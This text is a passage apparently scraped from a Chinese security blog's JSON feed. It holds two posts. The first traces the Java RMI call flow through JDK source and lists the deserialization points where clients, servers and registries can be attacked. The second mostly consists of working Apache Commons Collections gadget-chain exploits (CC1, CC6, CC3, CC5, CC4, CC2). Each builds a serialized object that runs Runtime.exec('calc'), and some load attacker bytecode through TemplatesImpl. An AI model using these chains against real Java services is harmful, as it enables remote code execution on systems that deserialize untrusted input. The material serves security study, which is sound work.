call.getResultStream(true); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break; &#125; 可以看到到处都是readObject，也就是说客户端可以通过传输恶意对象攻击注册中心。实际上这里也能看出，对注册中心来说，服务端和客户端没什么本质区别，只是一个调用lookup一个调用bind。所以没有ip限制的版本里，服务端也能直接远程攻击注册中心。这里还有个细节，server.lookup得到的是一个RemoteImplObj对象，通过writeObjecct写入输出流，但最后客户端反序列化得到的却是一个动态代理对象。这是因为这里的out是ConnectionOutputStream，父类是MarshalOutputStream，MarshalOutputStream的构造方法里调用了enableReplaceObject(true)，这样在序列化时会调用它的replaceObject 12345678910111213/** * Checks for objects that are instances of java.rmi.Remote * that need to be serialized as proxy objects. */protected final Object replaceObject(Object obj) throws IOException &#123; if ((obj instanceof Remote) &amp;&amp; !(obj instanceof RemoteStub)) &#123; Target target = ObjectTable.getTarget((Remote) obj); if (target != null) &#123; return target.getStub(); &#125; &#125; return obj;&#125; 所以传递过去的是代理对象而不是远程对象本身。分析完了在注册中心查找远程对象的部分，接下来分析最后一行，remoteObj.sayHello() 远程方法调用(客户端)之前分析已经知道remoteObj是一个动态代理了，那么调用它的方法时自然是走到了调用处理器类里面，跟进RemoteObjectInvocationHandler#invoke 1234567891011121314151617181920public Object invoke(Object proxy, Method method, Object[] args) throws Throwable&#123; if (! Proxy.isProxyClass(proxy.getClass())) &#123; throw new IllegalArgumentException(&quot;not a proxy&quot;); &#125; if (Proxy.getInvocationHandler(proxy) != this) &#123; throw new IllegalArgumentException(&quot;handler mismatch&quot;); &#125; if (method.getDeclaringClass() == Object.class) &#123; return invokeObjectMethod(proxy, method, args); &#125; else if (&quot;finalize&quot;.equals(method.getName()) &amp;&amp; method.getParameterCount() == 0 &amp;&amp; !allowFinalizeInvocation) &#123; return null; // ignore &#125; else &#123; return invokeRemoteMethod(proxy, method, args); &#125;&#125; 调用的是else里面的invokeRemoteMethod 12345678910111213141516171819202122232425262728293031323334private Object invokeRemoteMethod(Object proxy, Method method, Object[] args) throws Exception&#123; try &#123; if (!(proxy instanceof Remote)) &#123; throw new IllegalArgumentException( &quot;proxy not Remote instance&quot;); &#125; return ref.invoke((Remote) proxy, method, args, getMethodHash(method)); &#125; catch (Exception e) &#123; if (!(e instanceof RuntimeException)) &#123; Class&lt;?&gt; cl = proxy.getClass(); try &#123; method = cl.getMethod(method.getName(), method.getParameterTypes()); &#125; catch (NoSuchMethodException nsme) &#123; throw (IllegalArgumentException) new IllegalArgumentException().initCause(nsme); &#125; Class&lt;?&gt; thrownType = e.getClass(); for (Class&lt;?&gt; declaredType : method.getExceptionTypes()) &#123; if (declaredType.isAssignableFrom(thrownType)) &#123; throw e; &#125; &#125; e = new UnexpectedException(&quot;unexpected exception&quot;, e); &#125; throw e; &#125;&#125; 最后调用的是UnicastRef里面另一个重载的invoke，一样调用了executeCall，那么这里客户端也可能被攻击。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879public Object invoke(Remote obj, Method method, Object[] params, long opnum) throws Exception&#123; if (clientRefLog.isLoggable(Log.VERBOSE)) &#123; clientRefLog.log(Log.VERBOSE, &quot;method: &quot; + method); &#125; if (clientCallLog.isLoggable(Log.VERBOSE)) &#123; logClientCall(obj, method); &#125; Connection conn = ref.getChannel().newConnection(); RemoteCall call = null; boolean reuse = true; /* If the call connection is &quot;reused&quot; early, remember not to * reuse again. */ boolean alreadyFreed = false; try &#123; if (clientRefLog.isLoggable(Log.VERBOSE)) &#123; clientRefLog.log(Log.VERBOSE, &quot;opnum = &quot; + opnum); &#125; // create call context call = new StreamRemoteCall(conn, ref.getObjID(), -1, opnum); // marshal parameters try &#123; ObjectOutput out = call.getOutputStream(); marshalCustomCallData(out); Class&lt;?&gt;[] types = method.getParameterTypes(); for (int i = 0; i &lt; types.length; i++) &#123; marshalValue(types[i], params[i], out); &#125; &#125; catch (IOException e) &#123; clientRefLog.log(Log.BRIEF, &quot;IOException marshalling arguments: &quot;, e); throw new MarshalException(&quot;error marshalling arguments&quot;, e); &#125; // unmarshal return call.executeCall(); try &#123; Class&lt;?&gt; rtype = method.getReturnType(); if (rtype == void.class) return null; ObjectInput in = call.getInputStream(); /* StreamRemoteCall.done() does not actually make use * of conn, therefore it is safe to reuse this * connection before the dirty call is sent for * registered refs. */ Object returnValue = unmarshalValue(rtype, in); /* we are freeing the connection now, do not free * again or reuse. */ alreadyFreed = true; /* if we got to this point, reuse must have been true. */ clientRefLog.log(Log.BRIEF, &quot;free connection (reuse = true)&quot;); /* Free the call&#x27;s connection early. */ ref.getChannel().free(conn, true); return returnValue; &#125; catch (IOException | ClassNotFoundException e) &#123; // disable saving any refs in the inputStream for GC ...... &#125;&#125; 可以注意到如果返回值type不是void会调用unmarshalValue 12345678910111213141516171819202122232425262728protected static Object unmarshalValue(Class&lt;?&gt; type, ObjectInput in) throws IOException, ClassNotFoundException&#123; if (type.isPrimitive()) &#123; if (type == int.class) &#123; return Integer.valueOf(in.readInt()); &#125; else if (type == boolean.class) &#123; return Boolean.valueOf(in.readBoolean()); &#125; else if (type == byte.class) &#123; return Byte.valueOf(in.readByte()); &#125; else if (type == char.class) &#123; return Character.valueOf(in.readChar()); &#125; else if (type == short.class) &#123; return Short.valueOf(in.readShort()); &#125; else if (type == long.class) &#123; return Long.valueOf(in.readLong()); &#125; else if (type == float.class) &#123; return Float.valueOf(in.readFloat()); &#125; else if (type == double.class) &#123; return Double.valueOf(in.readDouble()); &#125; else &#123; throw new Error(&quot;Unrecognized primitive type: &quot; + type); &#125; &#125; else &#123; return in.readObject(); &#125;&#125; 当返回值类型不是这几种基础类型时就会调用反序列化，也就是服务端可以通过返回恶意对象来攻击客户端。接下来分析客户端调用时服务端的处理流程。 远程方法调用(服务端)和在注册中心查找远程对象时候的前半段一样，来到UnicastServerRef#dispatch 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113 public void dispatch(Remote obj, RemoteCall call) throws IOException &#123; // positive operation number in 1.1 stubs; // negative version number in 1.2 stubs and beyond... int num; long op; try &#123; // read remote call header ObjectInput in; try &#123; in = call.getInputStream(); num = in.readInt(); if (num &gt;= 0) &#123; if (skel != null) &#123; oldDispatch(obj, call, num); return; &#125; else &#123; throw new UnmarshalException( &quot;skeleton class not found but required &quot; + &quot;for client version&quot;); &#125; &#125; op = in.readLong(); &#125; catch (Exception readEx) &#123; throw new UnmarshalException(&quot;error unmarshalling call header&quot;, readEx); &#125; /* * Since only system classes (with null class loaders) will be on * the execution stack during parameter unmarshalling for the 1.2 * stub protocol, tell the MarshalInputStream not to bother trying * to resolve classes using its superclasses&#x27;s default method of * consulting the first non-null class loader on the stack. */ MarshalInputStream marshalStream = (MarshalInputStream) in; marshalStream.skipDefaultResolveClass(); Method method = hashToMethod_Map.get(op); if (method == null) &#123; throw new UnmarshalException(&quot;unrecognized method hash: &quot; + &quot;method not supported by remote object&quot;); &#125; // if calls are being logged, write out object id and operation logCall(obj, method); // unmarshal parameters Class&lt;?&gt;[] types = method.getParameterTypes(); Object[] params = new Object[types.length]; try &#123; unmarshalCustomCallData(in); for (int i = 0; i &lt; types.length; i++) &#123; params[i] = unmarshalValue(types[i], in); &#125; &#125; catch (java.io.IOException e) &#123; throw new UnmarshalException( &quot;error unmarshalling arguments&quot;, e); &#125; catch (ClassNotFoundException e) &#123; throw new UnmarshalException( &quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; // make upcall on remote object Object result; try &#123; result = method.invoke(obj, params); &#125; catch (InvocationTargetException e) &#123; throw e.getTargetException(); &#125; // marshal return value try &#123; ObjectOutput out = call.getResultStream(true); Class&lt;?&gt; rtype = method.getReturnType(); if (rtype != void.class) &#123; marshalValue(rtype, result, out); &#125; &#125; catch (IOException ex) &#123; throw new MarshalException(&quot;error marshalling return&quot;, ex); /* * This throw is problematic because when it is caught below, * we attempt to marshal it back to the client, but at this * point, a &quot;normal return&quot; has already been indicated, * so marshalling an exception will corrupt the stream. * This was the case with skeletons as well; there is no * immediately obvious solution without a protocol change. */ &#125; &#125; catch (Throwable e) &#123; logCallException(e); ObjectOutput out = call.getResultStream(false); if (e instanceof Error) &#123; e = new ServerError( &quot;Error occurred in server thread&quot;, (Error) e); &#125; else if (e instanceof RemoteException) &#123; e = new ServerException( &quot;RemoteException occurred in server thread&quot;, (Exception) e); &#125; if (suppressStackTraces) &#123; clearStackTraces(e); &#125; out.writeObject(e); &#125; finally &#123; call.releaseInputStream(); // in case skeleton doesn&#x27;t call.releaseOutputStream(); &#125;&#125; 不同的是这回不会进入old Dispatch，而是继续向下走，之后调用到unmarshalValue，前面写过这个方法会触发反序列化，那么客户端可以通过在参数值传payload来攻击服务端。目前为止分析了客户端、注册中心、服务端之间的调用过程，但实际上服务端上还有DGC服务，接下来分析下DGC服务的调用过程。 DGC调用流程(客户端)DGC(Distributed Garbage Collection)指分布式垃圾回收，前面的流程也提到了，远程对象发布时就会伴随着DGC对象的创建。前面介绍了在远程对象发布时服务端会生成一个DGCImpl_Stub对象，那么这个对象是也会像普通远程对象一样反序列化传递给客户端，还是像RegistryImpl_Stub一样在客户端本地生成呢？直觉上的感觉应该是后者，首先因为DGC和注册中心一样都是jdk自带类，第二是刚才分析了整个调用流程并没有发现通过序列化传递DGC代理对象的地方。那么看看DGCImpl_Stub的是怎么创建的，直接对DGC接口find usage，找到两处创建Stub的地方，第一个是之前说的DGCImpl的静态代码块，第二个在DGCClient$EndpointEntry的构造函数里 1234567891011121314private EndpointEntry(final Endpoint endpoint) &#123; this.endpoint = endpoint; try &#123; LiveRef dgcRef = new LiveRef(dgcID, endpoint, false); dgc = (DGC) Util.createProxy(DGCImpl.class, new UnicastRef(dgcRef), true); &#125; catch (RemoteException e) &#123; throw new Error(&quot;internal error creating DGC stub&quot;); &#125; renewCleanThread = AccessController.doPrivileged( new NewThreadAction(new RenewCleanThread(), &quot;RenewClean-&quot; + endpoint, true)); renewCleanThread.start();&#125; 下断点，发现入口是在RegistryImpl_Stub#lookup的ref.done： 123456789101112131415161718192021public void done(RemoteCall call) throws RemoteException &#123; /* Done only uses the connection inside the call to obtain the * channel the connection uses. Once all information is read * from the connection, the connection may be freed. */ clientRefLog.log(Log.BRIEF, &quot;free connection (reuse = true)&quot;); /* Free the call connection early. */ free(call, true); try &#123; call.done(); &#125; catch (IOException e) &#123; /* WARNING: If the conn has been reused early, then it is * too late to recover from thrown IOExceptions caught * here. This code is relying on StreamRemoteCall.done() * not actually throwing IOExceptions. */ &#125;&#125; 跟进StreamRemoteCall#done 1234567891011121314151617181920212223242526272829303132333435public void done() throws IOException &#123; /* WARNING: Currently, the UnicastRef.java invoke methods rely * upon this method not throwing an IOException. */ releaseInputStream();&#125;public void releaseInputStream() throws IOException &#123; /* WARNING: Currently, the UnicastRef.java invoke methods rely * upon this method not throwing an IOException. */ try &#123; if (in != null) &#123; // execute MarshalInputStream &quot;done&quot; callbacks try &#123; in.done(); &#125; catch (RuntimeException e) &#123; &#125; // add saved references to DGC table in.registerRefs(); /* WARNING: The connection being passed to done may have * already been freed. */ in.done(conn); &#125; conn.releaseInputStream(); &#125; finally &#123; in = null; &#125;&#125; 调用了ConnectionInputStream#registerRefs 12345678void registerRefs() throws IOException &#123; if (!incomingRefTable.isEmpty()) &#123; for (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry : incomingRefTable.entrySet()) &#123; DGCClient.registerRefs(entry.getKey(), entry.getValue()); &#125; &#125;&#125; 这里有个if，目前不需要关注细节，总之客户端调用时是可以进去的，那么跟进DGCClient#registerRefs 12345678910111213static void registerRefs(Endpoint ep, List&lt;LiveRef&gt; refs) &#123; /* * Look up the given endpoint and register the refs with it. * The retrieved entry may get removed from the global endpoint * table before EndpointEntry.registerRefs() is able to acquire * its lock; in this event, it returns false, and we loop and * try again. */ EndpointEntry epEntry; do &#123; epEntry = EndpointEntry.lookup(ep); &#125; while (!epEntry.registerRefs(refs));&#125; 这是一个do while循环，先进入EndpointEntry#lookup 1234567891011121314151617181920public static EndpointEntry lookup(Endpoint ep) &#123; synchronized (endpointTable) &#123; EndpointEntry entry = endpointTable.get(ep); if (entry == null) &#123; entry = new EndpointEntry(ep); endpointTable.put(ep, entry); /* * While we are tracking live remote references registered * in this VM, request a maximum latency for inspecting the * entire heap from the local garbage collector, to place * an upper bound on the time to discover remote references * that have become unreachable (see bugid 4171278). */ if (gcLatencyRequest == null) &#123; gcLatencyRequest = GC.requestLatency(gcInterval); &#125; &#125; return entry; &#125;&#125; 可以看到触发了EndpointEntry的实例化。那么这里就创建了DGCImpl_Stub，接下来看下哪里调用了DGCImpl_Stub里面具体的方法。实际上就在EndpointEntry的构造函数里开启的新线程，看看RenewCleanThread#run 12345678910111213141516171819public void run() &#123; do &#123; ...... boolean needRenewal_ = needRenewal; Set&lt;RefEntry&gt; refsToDirty_ = refsToDirty; long sequenceNum_ = sequenceNum; AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; if (needRenewal_) &#123; makeDirtyCall(refsToDirty_, sequenceNum_); &#125; if (!pendingCleans.isEmpty()) &#123; makeCleanCalls(); &#125; return null; &#125;&#125;, SOCKET_ACC); &#125; while (!removed || !pendingCleans.isEmpty());&#125; 可以看到里面循环调用makeDirtyCall 123456789101112131415161718192021222324252627private void makeDirtyCall(Set&lt;RefEntry&gt; refEntries, long sequenceNum) &#123; assert !Thread.holdsLock(this); ObjID[] ids; if (refEntries != null) &#123; ids = createObjIDArray(refEntries); &#125; else &#123; ids = emptyObjIDArray; &#125; long startTime = System.currentTimeMillis(); try &#123; Lease lease = dgc.dirty(ids, sequenceNum, new Lease(vmid, leaseValue)); long duration = lease.getValue(); long newRenewTime = computeRenewTime(startTime, duration); long newExpirationTime = startTime + duration; synchronized (this) &#123; dirtyFailures = 0; setRenewTime(newRenewTime); expirationTime = newExpirationTime; &#125; &#125; catch (Exception e) &#123; ...... dgc.dirty这里调用了DGCImpl_Stub#dirty 123456789101112131415161718192021222324252627282930313233343536373839404142public java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.Lease $param_Lease_3) throws java.rmi.RemoteException &#123; try &#123; java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) this, operations, 1, interfaceHash); try &#123; java.io.ObjectOutput out = call.getOutputStream(); out.writeObject($param_arrayOf_ObjID_1); out.writeLong($param_long_2); out.writeObject($param_Lease_3); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e); &#125; ref.invoke(call); java.rmi.dgc.Lease $result; Connection connection = ((StreamRemoteCall) call).getConnection(); try &#123; java.io.ObjectInput in = call.getInputStream(); if (in instanceof ObjectInputStream) &#123; /** * Set a filter on the stream for the return value. */ ObjectInputStream ois = (ObjectInputStream) in; AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;)() -&gt; &#123; ObjectInputFilter.Config.setObjectInputFilter(ois, DGCImpl_Stub::leaseFilter); return null; &#125;); &#125; $result = (java.rmi.dgc.Lease) in.readObject(); &#125; catch (java.io.IOException | java.lang.ClassNotFoundException e) &#123; if (connection instanceof TCPConnection) &#123; // Modified to prevent re-use of the connection after an exception ((TCPConnection) connection).getChannel().free(connection, false); &#125; throw new java.rmi.UnmarshalException(&quot;error unmarshalling return&quot;, e); &#125; finally &#123; ref.done(call); &#125; return $result; &#125; catch (java.lang.RuntimeException e) &#123; ...... 调用了in.readObject()，也就是说DGC客户端调用dirty时有可能被DGC服务端攻击。而前面的每个stub的调用都会触发ref.done，也就是每次stub的调用都可能被DGC服务端攻击。为了看源码用的是8u141这个版本，有个过滤器，但是低版本没有。接下来分析下服务端的调用流程 DGC调用流程(服务端)实际上这几个服务端的前半部分都是一样的，都是到UnicastServerRef#dispatch。然后DGCImpl_Stub也是jdk内置类，所以进入oldDispatch，最后进入DGCImpl_Skel#dispatch。clean方法基本不会调用，就看dirty部分 1234567891011121314151617181920212223242526case 1: // dirty(ObjID[], long, Lease) &#123; java.rmi.server.ObjID[] $param_arrayOf_ObjID_1; long $param_long_2; java.rmi.dgc.Lease $param_Lease_3; try &#123; java.io.ObjectInput in = call.getInputStream(); $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject(); $param_long_2 = in.readLong(); $param_Lease_3 = (java.rmi.dgc.Lease) in.readObject(); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; catch (java.lang.ClassNotFoundException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; java.rmi.dgc.Lease $result = server.dirty($param_arrayOf_ObjID_1, $param_long_2, $param_Lease_3); try &#123; java.io.ObjectOutput out = call.getResultStream(true); out.writeObject($result); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break; &#125; 服务端也调用了in.readObject，也就是说DGC客户端可以攻击DGC服务端。目前为止就分析完了一次正常的RMI调用的完整流程，那么总结下整个过程中的反序列化点以及导致的攻击，这里不具体区分触发的服务是注册中心还是DGC之类的，只按客户端/服务端/注册中心分类：1、攻击客户端：RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端DGCImpl_Stub#dirty-&gt;服务端攻击客户端UnicastRef#invoke-&gt;服务端攻击客户端StreamRemoteCall#executeCall-&gt;服务端/注册中心攻击客户端2、攻击服务端UnicastServerRef#dispatch-&gt;客户端攻击服务端DGCImpl_Skel#dispatch-&gt;客户端攻击服务端3、攻击注册中心RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心通过完整的分析RMI调用流程，发现了上述反序列化攻击点，下篇文章会实现具体的攻击方式。 参考链接https://docs.oracle.com/javase/tutorial/rmi/implementing.htmlhttps://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.htmlhttp://scz.617.cn:8/network/202002221000.txthttps://www.jianshu.com/p/2c78554a3f36https://last-las.github.io/2020/12/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0rmi%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86https://www.cnblogs.com/binarylei/p/12115986.html","categories":[],"tags":[]},{"title":"CommonsCollections反序列化链整理","slug":"CommonsCollections反序列化链整理","date":"2021-08-23T15:53:21.000Z","updated":"2021-11-18T11:49:02.974Z","comments":true,"path":"2021/08/23/CommonsCollections反序列化链整理/","link":"","permalink":"http://yoursite.com/2021/08/23/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%95%B4%E7%90%86/","excerpt":"整理下cc链，开局先上图，做了好几个小时","text":"整理下cc链，开局先上图，做了好几个小时可以看出其实这么多条链都只是排列组合，基本没有非用哪条链不可的情况。这8条链里面，到执行点sink前有6条路径到ChainedTransformer.transform，一条路径到TransformingComparator.compare，共7种。而执行点中有3种执行方法，所以只从已有链出发就能推出21条链。还可以添加新的元素，比如使用DefaultedMap代替LazyMap，或者添加URLClassLoader.loadClass作为执行点，都可以创造所谓的新的链条，根据需求修改即可。大概写了下各条链的简易版，顺序按照直觉： CC1CC1用IncokerTransformer+Runtime作为代码执行点，调用链用LazyMap.get。触发点用的是AnnotationInvocationHandler，因此受到jdk版本限制，需要jdk&lt;8u71。 12345678910111213141516171819202122232425262728293031323334 Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);// 这段是用tranformedMap的版本CC0// HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();// map.put(&quot;value&quot;,&quot;aaa&quot;);// Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);////// Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);// Constructor annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class);// annotationInvocationdhdlConstructor.setAccessible(true);// Object o = annotationInvocationdhdlConstructor.newInstance(Target.class,transformedMap); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationdhdlConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Override.class,lazyMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, h); Object o = annotationInvocationdhdlConstructor.newInstance(Override.class, mapProxy); serialize(o); unserialize(&quot;ser.bin&quot;); CC6CC6将触发点改成了HashMap，解决了jdk版本限制的问题，其他和CC1一样。写Poc时候注意两个问题，一是LazyMap在put时会触发调用链导致本地执行，二是LazyMap触发一次后会添加key导致不能再次触发，这两个问题都可以通过反射改值解决。先放个没用的transfromer，序列化前再改回来。 12345678910111213141516171819202122232425Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;); HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry, &quot;bbb&quot;); lazyMap.remove(&quot;aaa&quot;); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap,chainedTransformer); serialize(map2); unserialize(&quot;ser.bin&quot;); CC3CC3的触发和调用链部分和CC1相同，因此同样受jdk版本限制。主要修改了代码执行的地方，调用了jdk原生的TemplatesImpl+TrAXFilter类，实现动态类加载，引入了新的代码执行点。 1234567891011121314151617181920212223242526272829303132333435363738 TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;aaaa&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;D://tmp/classes/Test.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates,codes);// Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);// tfactoryField.setAccessible(true);// tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer(); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), instantiateTransformer &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationdhdlConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Override.class,lazyMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, h); Object o = annotationInvocationdhdlConstructor.newInstance(Override.class, mapProxy); serialize(o); unserialize(&quot;ser.bin&quot;); 需要按照代码要求构造动态加载的类Test.java，照着报错调就行 1234567891011121314151617181920public class Test extends AbstractTranslet &#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; CC5和CC6基本没区别，改了触发点，从HashMap变成了BadAttributeValueExpException。没什么特别意义，只是又多了一个从toString到get的链路。 1234567891011121314151617181920212223Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);Class c = badAttributeValueExpException.getClass();Field factoryField = c.getDeclaredField(&quot;val&quot;);factoryField.setAccessible(true);factoryField.set(badAttributeValueExpException,tiedMapEntry);serialize(badAttributeValueExpException);unserialize(&quot;ser.bin&quot;); CC4代码执行部分和CC3一样用的是TemplatesImpl+TrAXFilter。修改了触发点和调用链部分，调用链使用了在CommonsCollections4里才实现Serializable接口的TransformingComparator类，触发点使用了优先队列，提供了一个使用compare的链路。 1234567891011121314151617181920212223242526272829303132333435TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;aaaa&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;D://tmp/classes/Test.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates,codes); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), instantiateTransformer &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer&lt;&gt;(transformers); TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator,chainedTransformer); serialize(priorityQueue); unserialize(&quot;ser.bin&quot;); CC2和CC4一样都是CC4.0版本下的利用链，区别是代码执行部分改成了用InvokerTransformer触发动态类加载和初始化，并且不使用Transfromer数组了。由于不依赖ConstantTransformer，所以需要在最外层的参数里把构造好的templates传进去。 12345678910111213141516171819202122232425262728TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;D://tmp/classes/Test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(templates);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator,invokerTransformer);serialize(priorityQueue);unserialize(&quot;ser.bin&quot;); CC7和CC6差不多，把触发点改成了HashTable，提供了一个使用equals方法的调用链，不受jdk限制，没啥特别的了。两个Map需要hash相等，其实不需要哈希碰撞，随便写一个值异或回来就行。 1234567891011121314151617181920212223242526272829 Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;), new 